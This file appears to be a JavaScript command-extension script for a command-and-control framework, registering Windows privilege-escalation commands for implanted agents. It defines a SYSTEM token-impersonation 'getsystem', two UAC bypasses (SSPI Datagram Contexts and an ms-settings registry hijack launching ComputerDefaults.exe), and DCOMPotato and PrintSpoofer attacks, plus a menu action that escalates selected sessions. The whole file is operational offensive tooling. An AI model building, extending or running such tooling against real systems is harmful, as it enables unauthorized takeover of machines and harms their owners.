var metadata = {
    name: "Elevation-BOF",
    description: "BOFs for context elevation"
};

/// COMMANDS

var _cmd_getsystem_token = ax.create_command("token", "Elevate the current agent to SYSTEM and gain the TrustedInstaller group privilege through impersonation", "getsystem token");
_cmd_getsystem_token.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let hook = function (task)
    {
        if(/Impersonate to SYSTEM & TrustedInstaller succeeded/.test(task.text)) {
            ax.agent_set_impersonate(task.agent, "SYSTEM", true);
        }
        return task;
    }

    let bof_path = ax.script_dir() + "_bin/getsystem_token." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof ${bof_path}`, "Task: Get system via token (BOF)", hook);
});
var cmd_getsystem = ax.create_command("getsystem", "Elevate context to SYSTEM");
cmd_getsystem.addSubCommands([_cmd_getsystem_token]);


var _cmd_uacbybass_sspi = ax.create_command("sspi", "Forges a token from a fake network authentication though SSPI Datagram Contexts", "uacbybass sspi c:\\windows\\tasks\\agent.exe");
_cmd_uacbybass_sspi.addArgString("path", true);
_cmd_uacbybass_sspi.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let path = parsed_json["path"];

    let bof_params = ax.bof_pack("cstr", [path]);
    let bof_path = ax.script_dir() + "_bin/uac_sspi." + ax.arch(id) + ".o";

    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, "Task: UAC Bypass (SSPI Datagram Contexts)");
});
var _cmd_uacbybass_regshell = ax.create_command("regshellcmd", "Modifies the \"ms-settings\\Shell\\Open\\command\" registry key and executes an auto-elevated EXE (ComputerDefaults.exe).", "uacbybass regshellcmd c:\\windows\\tasks\\agent.exe");
_cmd_uacbybass_regshell.addArgString("path", true);
_cmd_uacbybass_regshell.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let path = parsed_json["path"];

    let bof_params = ax.bof_pack("cstr", [path]);
    let bof_path = ax.script_dir() + "_bin/uac_regshellcmd." + ax.arch(id) + ".o";

    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, "Task: UAC Bypass (registry key Command)");
});
var cmd_uacbybass = ax.create_command("uacbybass", "Perform UAC bypass");
cmd_uacbybass.addSubCommands([_cmd_uacbybass_sspi, _cmd_uacbybass_regshell]);


var cmd_dcom_potato = ax.create_command("potato-dcom", "DCOMPotato - get SYSTEM via SeImpersonate privileges.", "potato-dcom --run C:\\Windows\\System32\\cmd.exe /c whoami /all");
cmd_dcom_potato.addArgBool( "--token", "Elevate the current agent to SYSTEM context");
cmd_dcom_potato.addArgFlagString( "--run", "program", false, "Run new process in SYSTEM context (Program with arguments)");
cmd_dcom_potato.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {

    let use_token = 0;
    let run_program = "";

    if(parsed_json["--token"]) { use_token = 1; }
    if("program" in parsed_json) { run_program = parsed_json["program"]; }

    if( (use_token && run_program.length) || (!use_token && run_program.length == 0) ) { throw new Error("Use only --token or --run"); }

    let bof_path = ax.script_dir() + "_bin/DCOMPotato." + ax.arch(id) + ".o";
    let bof_params = ax.bof_pack("int,wstr", [use_token, run_program]);

    if (use_token) {
        let hook = function (task)
        {
            if(/Impersonate to SYSTEM succeeded/.test(task.text)) {
                ax.agent_set_impersonate(task.agent, "SYSTEM", true);
            }
            return task;
        }
        ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, "BOF DCOMPotato: elevate to SYSTEM", hook);
    }
    else {
        ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, `BOF DCOMPotato: run ${run_program}`);
    }
});



var cmd_printspoofer = ax.create_command("potato-print", "LPE via Print Spooler (Named Pipe Impersonation)", "potato-print --token");
cmd_printspoofer.addArgBool( "--token", "Elevate the current agent to SYSTEM context");
cmd_printspoofer.addArgFlagString( "--run", "program", false, "Run new process in SYSTEM context (Program with arguments)");
cmd_printspoofer.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {

    let use_token = 0;
    let run_program = "";

    if(parsed_json["--token"]) { use_token = 1; }
    if(parsed_json.hasOwnProperty("program")) { run_program = parsed_json["program"]; }

    if( (use_token && run_program.length) || (!use_token && run_program.length == 0) ) { throw new Error("Use only --token or --run"); }

    let bof_path = ax.script_dir() + "_bin/printspoofer." + ax.arch(id) + ".o";
    let bof_params = ax.bof_pack("int,wstr", [use_token, run_program]);

    if (use_token) {
        let hook = function (task)
        {
            if(/Impersonate to SYSTEM succeeded/.test(task.text)) {
                ax.agent_set_impersonate(task.agent, "SYSTEM", true);
            }
            return task;
        }
        ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, "BOF PrintSpoofer: elevate to SYSTEM", hook);
    }
    else {
        ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, `BOF PrintSpoofer: run ${run_program}`);
    }
});



var group_test = ax.create_commands_group("Elevation-BOF", [cmd_getsystem, cmd_uacbybass, cmd_dcom_potato, cmd_printspoofer]);
ax.register_commands_group(group_test, ["beacon", "gopher", "kharon"], ["windows"], []);



/// MENU

let system_access_action = menu.create_action("Get System", function(agents_id) { agents_id.forEach(id => ax.execute_command(id, "getsystem token")) });
menu.add_session_access(system_access_action, ["beacon", "gopher", "kharon"], ["windows"]);